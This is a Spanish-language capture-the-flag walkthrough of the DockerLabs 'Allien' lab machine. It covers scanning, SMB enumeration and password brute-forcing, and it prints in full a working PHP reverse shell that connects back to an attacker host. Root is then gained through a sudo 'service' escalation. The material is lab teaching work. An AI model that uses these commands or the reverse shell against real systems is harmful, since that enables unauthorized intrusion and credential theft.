# Allien — DockerLabs.es 🐳

<img width="552" height="301" alt="1" src="https://github.com/user-attachments/assets/a6259154-b2e7-41c8-a45a-0f6160efa7c8" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Realizamos un escaneo con nmap:

```bash
sudo nmap -p- --open --min-rate 2000 -A -sS -n -Pn 172.17.0.2 -oN escaneo.txt
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 08:52 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000057s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)
|_  256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Login
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SAMBASERVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-10-30T12:52:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.06 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
```

Tenemos los puertos 22,80,139 y 445 abiertos.

Ingresamos al servidor web y nos encontramos con esto:

<img width="1345" height="576" alt="2" src="https://github.com/user-attachments/assets/4c2a756f-4c8d-4e65-8f6f-8bd3b27c690c" />

Realizamos un fuzzing web con gobuster:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt,java,jar
```

<img width="1162" height="481" alt="3" src="https://github.com/user-attachments/assets/84e20296-e73d-4147-9518-92890bb71c13" />

Y cuando entramos en el directorio “productos.php” nos encontramos con lo siguiente:

<img width="1360" height="574" alt="4" src="https://github.com/user-attachments/assets/9a8639cc-c9ef-46d5-9e10-c6461300fd6b" />

Como no hay nada interesante en los dos directorios, vamos a ver que hay en los puertos smb.

---

## 2. Enumeración

Para eso primero usamos crackmapexec para ver los recursos compartidos sin proporcionar credenciales de la siguiente forma:

```bash
crackmapexec smb 172.17.0.2 -u '' -p '' --shares 
```

<img width="1353" height="373" alt="5" src="https://github.com/user-attachments/assets/1d223069-cd50-4129-9758-9533ccee4d1b" />

Después pasamos a enumerar los usuarios disponibles con el siguiente comando:

```bash
crackmapexec smb 172.17.0.2 -u '' -p '' --users
```

<img width="1356" height="501" alt="6" src="https://github.com/user-attachments/assets/0016a9ba-cb7a-43b7-a717-6a038846ace5" />

Y de la lista de usuarios nos llama la atención el usuario “satriani7”, por lo que vamos a hacerle una fuerza bruta a este usuario para conseguir la contraseña.

```bash
crackmapexec smb 172.17.0.2 -u "satriani7" -p /usr/share/wordlists/rockyou.txt
```

<img width="966" height="270" alt="7" src="https://github.com/user-attachments/assets/8a98551d-318b-4022-846b-c1215136c53a" />

Conseguimos el usuario “satriani7” y la contraseña “50cent”.

Ahora procedemos a enumerar los archivos compartidos y ver los permisos que tiene el usuario satriani7 en ellos.

```bash
crackmapexec smb 172.17.0.2 -u "satriani7" -p '50cent' --shares
```

<img width="1349" height="371" alt="8" src="https://github.com/user-attachments/assets/86266a4a-c0f1-483d-ab22-2a342d7f32d4" />

Entramos al archivo compartido “backup24” con smbclient:

```bash
smbclient //172.17.0.2/backup24 -U satriani7
```

<img width="629" height="248" alt="9" src="https://github.com/user-attachments/assets/3ed8ea32-2319-49b3-a9de-a504a6452fcf" />


Y si entramos a \Docuents\Personal y listamos los archivos del directorio podemos ver que tiene dos llamados “notes.txt” y “credentials.txt”

Descargamos ambos archivos con el comando “get + nombre del archivo”

<img width="1079" height="327" alt="10" src="https://github.com/user-attachments/assets/26f96870-0648-4ac3-af1b-bc7bae6e5f1d" />

Luego leemos el archivo “credentials.txt” y nos mostrará las siguientes credenciales

<img width="750" height="541" alt="11" src="https://github.com/user-attachments/assets/231ff5e9-d344-4a99-a98b-52c9b61c8e72" />


---

## 3. Explotación

Ya teniendo las credenciales del usuario “administrador” con la contraseña “Adm1nP4ss2024”, ahora podemos intentar enumerar los archivos compartidos que tiene disponibles.

```bash
crackmapexec smb 172.17.0.2 -u 'administrador' -p 'Adm1nP4ss2024' --shares
```

<img width="1344" height="368" alt="12" src="https://github.com/user-attachments/assets/3f35daf1-f3b0-4666-a0eb-2dd47718cadb" />

Y como vemos el archivo compartido “home” procedemos a entrar y a listar sus archivos de la siguiente forma:

```bash
smbclient //172.17.0.2/home -U administrador  
```

<img width="694" height="245" alt="13" src="https://github.com/user-attachments/assets/494ddb90-94e2-4f4e-825d-5ceff16d426e" />

En este punto vemos el archivo “productos.php” y si recordamos el fuzzing web que hicimos con gobuster podemos ver que también aparecia este directorio, por lo que podemos intuir que éste usuario hostea la página web y si subimos un archivo lo podemos ver. Por lo que haremos un archivo llamado “shell.php” que contenga una reverse shell y lo subiremos.

Creamos la reverse shell con PentestMonkey con la dirección ip de nuestra máquina atacante y el puerto 443 en este caso.

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
Y lo subimos con el comando “put”

<img width="645" height="240" alt="14" src="https://github.com/user-attachments/assets/6ef8572f-195c-4678-ba22-c27e00a37249" />

Luego nos ponemos en escucha con netcat en el puerto 443

```bash
nc -lnvp 443
```

E ingresamos al 172.17.0.2/shell.php

<img width="1112" height="437" alt="15" src="https://github.com/user-attachments/assets/336c0e5f-6e2f-40a9-a13a-3e3bab31063d" />

<img width="990" height="315" alt="16" src="https://github.com/user-attachments/assets/ba6c5069-01a2-47e5-be42-039fc15db2d0" />


Luego de obtener acceso, hacemos el tratamiento de la TTY.

```bash
script /dev/null -c bash
ctrl z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```


---

## 4. Escalada de Privilegios

Una vez dentro, listamos los binarios disponibles con sudo -l

<img width="788" height="151" alt="17" src="https://github.com/user-attachments/assets/948e32c0-cc13-48f5-ae76-77dd38951822" />

Y realizamos la escalada de privilegios con el binario service

```bash
sudo /usr/sbin/service ../../bin/sh
```

<img width="557" height="105" alt="18" src="https://github.com/user-attachments/assets/334e5b01-2c69-41a6-aaa7-a01686a3f7e7" />


**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Reconocimiento con Nmap
- Enumeración de servicios
- Escalada de privilegios
